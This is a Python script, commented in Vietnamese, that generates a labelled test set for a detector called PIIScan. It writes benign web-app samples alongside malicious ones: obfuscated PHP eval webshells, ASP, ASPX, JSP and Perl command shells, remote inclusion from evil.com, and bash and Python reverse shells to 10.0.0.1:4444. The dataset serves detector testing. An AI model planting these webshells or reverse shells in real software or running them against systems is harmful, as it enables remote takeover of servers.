#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tạo THÊM các file lỗ hổng (malicious) và an toàn (benign) cho bộ test PIIScan.

File này bổ sung vào bộ dataset hiện có (không xóa file cũ).
Tập trung vào các loại obfuscation & đa ngôn ngữ để thử detector nâng cao.
"""
import os

BASE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "test_dataset")
MAL = os.path.join(BASE, "malicious")
BENIGN = os.path.join(BASE, "benign")

os.makedirs(MAL, exist_ok=True)
os.makedirs(BENIGN, exist_ok=True)

# ==========================================================
# MALICIOUS — nâng cao (obfuscation, đa ngôn ngữ)
# ==========================================================

MORE_MALICIOUS = {
    # XOR obfuscation
    "php_xor_obfuscated.php": """<?php
// XOR obfuscation webshell
$_ = 'assert';
$_ = $_ ^ "\\x00\\x00\\x00\\x00\\x00\\x00";
@${'_'}[$_]($_POST['x']);
${'_'.$_}['_']($_GET['c']);
?>
""",

    # base64 decode nhiều lớp
    "php_multilayer_base64.php": """<?php
// base64_decode lồng nhiều lớp
$c = base64_decode('ZXZhbCgkX1BPU1RbJ2MnXSk7');  // eval($_POST['c']);
eval(base64_decode($c));
?>
""",

    # gzinflate + base64
    "php_gzinflate.php": """<?php
// gzinflate(base64_decode(...))
eval(gzinflate(base64_decode('S4uPT8xLSSxJ1MtPzs9NScotzi9KzUlVCgYA')));
?>
""",

    # str_rot13 + eval
    "php_rot13.php": """<?php
// str_rot13 che giấu
$a = str_rot13('riny($_CBFG[p]');  // eval($_POST[c]
eval(str_rot13($a));
?>
""",

    # hex2bin
    "php_hex.php": """<?php
// hex2bin payload
eval(hex2bin('6576616c28245f504f53545b2763275d293b'));
?>
""",

    # preg_replace /e (deprecated nhưng vẫn là vector)
    "php_preg_replace.php": """<?php
// preg_replace với modifier /e thực thi mã
$s = 'system("id")';
@preg_replace('/.*/e', $s, '');
?>
""",

    # create_function
    "php_create_function.php": """<?php
// create_function thực thi mã từ biến
$code = 'return system($_GET["c"]);';
$f = create_function('', $code);
$f();
?>
""",

    # include biến remote
    "php_include_remote.php": """<?php
// Remote file inclusion
include $_GET['page'];
require($_POST['file']);
include_once("http://evil.com/shell.txt");
?>
""",

    # ASP webshell
    "asp_cmd.asp": """<%
' ASP webshell don gian
Set s = CreateObject("WScript.Shell")
Set o = s.Exec("cmd /c " & Request("cmd"))
Response.Write o.StdOut.ReadAll()
%>
""",

    # ASP.NET / aspx webshell
    "aspx_cmd.aspx": """<%@ Page Language="C#" %>
<%
    String cmd = Request["cmd"];
    System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd);
    System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd);
    System.Diagnostics.Process.Start(psi);
%>
""",

    # JSP webshell
    "jsp_cmd.jsp": """<%@ page import="java.util.*,java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
%>
""",

    # Shell reverse shell
    "sh_reverse_shell.sh": """#!/bin/bash
# Reverse shell qua /dev/tcp
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
""",

    # Perl webshell
    "pl_cmd.pl": """#!/usr/bin/perl
# Perl backdoor
use CGI;
my $q = CGI->new;
my $cmd = $q->param('cmd');
print `$cmd`;
system($cmd);
""",

    # Python reverse shell
    "python_reverse.py": """import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
""",
}

for name, content in MORE_MALICIOUS.items():
    with open(os.path.join(MAL, name), "w", encoding="utf-8") as f:
        f.write(content)


# ==========================================================
# BENIGN — code lành thực tế (frameworks, thư viện phổ biến)
# ==========================================================

MORE_BENIGN = {
    # PHP class model (giống Laravel/WordPress)
    "php_model.php": """<?php
// Model du lieu - khong co truy cap he thong
class User {
    private $pdo;

    public function __construct(PDO $pdo) {
        $this->pdo = $pdo;
    }

    public function findByEmail($email) {
        $stmt = $this->pdo->prepare("SELECT * FROM users WHERE email = ?");
        $stmt->execute([$email]);
        return $stmt->fetch(PDO::FETCH_ASSOC);
    }

    public function create($data) {
        $sql = "INSERT INTO users (name, email) VALUES (:name, :email)";
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([
            ':name' => $data['name'],
            ':email' => $data['email'],
        ]);
        return $this->pdo->lastInsertId();
    }
}
?>
""",

    "php_router.php": """<?php
// Router don gian - xu ly URL
$routes = [
    '/' => 'HomeController@index',
    '/about' => 'PageController@about',
    '/contact' => 'PageController@contact',
];

$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$handler = $routes[$uri] ?? 'ErrorController@notFound';
list($controller, $method) = explode('@', $handler);
echo "Route: $controller::$method";
?>
""",

    # Python Flask app an toàn
    "python_flask_app.py": """from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', title='Trang chu')

@app.route('/api/users/<int:user_id>')
def get_user(user_id):
    # Truy van an toan voi tham so hoa
    user = {"id": user_id, "name": "Nguyen Van A"}
    return jsonify(user)

@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    if len(keyword) > 100:
        keyword = keyword[:100]
    return jsonify({"query": keyword, "results": []})

if __name__ == '__main__':
    app.run(debug=False, port=5000)
""",

    # Python tính toán khoa học
    "python_data_analysis.py": """import statistics
from collections import Counter

def phan_tich_du_lieu(diem_thi):
    diem = [d for d in diem_thi if 0 <= d <= 10]
    if not diem:
        return {}

    return {
        "trung_binh": statistics.mean(diem),
        "trung_vi": statistics.median(diem),
        "lon_nhat": max(diem),
        "nho_nhat": min(diem),
        "do_lech_chuan": statistics.stdev(diem) if len(diem) > 1 else 0,
        "phan_bo": dict(Counter(diem)),
    }

ket_qua = phan_tich_du_lieu([8.5, 7.0, 9.2, 6.5, 8.0])
print(ket_qua)
""",

    # JavaScript React component an toàn
    "js_react_component.jsx": """import React, { useState } from 'react';

export default function LoginForm() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState(null);

    const handleSubmit = async (e) => {
        e.preventDefault();
        try {
            const res = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password }),
            });
            if (!res.ok) {
                setError('Dang nhap that bai');
            }
        } catch (err) {
            setError('Loi ket noi');
        }
    };

    return (
        <form onSubmit={handleSubmit}>
            <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} />
            <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} />
            <button type="submit">Dang nhap</button>
            {error && <p className="error">{error}</p>}
        </form>
    );
}
""",

    # Node.js Express app an toàn
    "js_express_server.js": """const express = require('express');
const app = express();
const port = 3000;

app.use(express.json());

app.get('/', (req, res) => {
    res.send('Xin chao cac ban!');
});

app.get('/api/products', (req, res) => {
    const products = [
        { id: 1, name: 'Ao thun', price: 100000 },
        { id: 2, name: 'Quan jeans', price: 250000 },
    ];
    res.json(products);
});

app.post('/api/orders', (req, res) => {
    const { productId, quantity } = req.body;
    res.status(201).json({ message: 'Dat hang thanh cong', productId, quantity });
});

app.listen(port, () => {
    console.log(`Server dang chay tai http://localhost:${port}`);
});
""",

    # SQL dump (nhưng không có mã độc)
    "sql_schema.sql": """-- Cau truc bang co so du lieu
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(100) NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE products (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(200) NOT NULL,
    price DECIMAL(10, 2) NOT NULL,
    stock INT DEFAULT 0
);

INSERT INTO products (name, price, stock) VALUES
    ('Laptop Dell', 15000000, 10),
    ('iPhone 15', 22000000, 5);
""",

    # Shell script dọn dẹp an toàn
    "sh_cleanup.sh": """#!/bin/bash
# Script don dep log cu an toan (khong co reverse shell)
find /var/log/myapp -name "*.log" -mtime +30 -delete
echo "Da xoa log cu hon 30 ngay"
""",
}

for name, content in MORE_BENIGN.items():
    with open(os.path.join(BENIGN, name), "w", encoding="utf-8") as f:
        f.write(content)

# ==========================================================
# Tổng kết
# ==========================================================
print("=" * 60)
print("DA THEM FILE MOI VAO BO TEST DATASET")
print("=" * 60)
print(f"malicious/ : +{len(MORE_MALICIOUS)} file ({len(os.listdir(MAL))} tong)")
print(f"benign/    : +{len(MORE_BENIGN)} file ({len(os.listdir(BENIGN))} tong)")
print()
print("File malicious moi:")
for n in sorted(MORE_MALICIOUS):
    print(f"  -> {n}")
print()
print("File benign moi:")
for n in sorted(MORE_BENIGN):
    print(f"  -> {n}")
print("=" * 60)